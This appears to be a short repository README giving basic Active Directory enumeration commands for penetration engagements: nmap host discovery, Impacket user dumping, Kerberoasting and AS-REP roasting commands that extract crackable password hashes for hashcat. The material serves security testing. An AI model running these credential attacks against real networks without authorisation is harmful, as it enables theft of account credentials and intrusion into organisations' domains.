# Ba51c_Activ3_Direct0ry_3numeration
In most engagements regarding Active Directory, credentials are king. This repo contains basic enumeration commands that will help gain more insight into the target network and its identities. 


# IP Discovery Commands
Once connected to the private/internal range of the target, these commands will assist in IP discovery as well as Services that run on the IP. 
- nmap -sn <IP/24>
- nmap -Pn <IP/24>


# Impacket to Rule them All
"What is Impacket used for?
Impacket is an open-source collection of modules written in Python for programmatically constructing and manipulating network protocols."
If credentials have been gained, they will assist with the following commands that can be run in the domain

*Enter details between the placeholders --> ()

## Getting AD Users
python3 GetADUsers.py -all '(domain)/(user):(password)' -dc-ip (IP)

## Kerberoasting 
python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request

## ASREP Roasting
python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt

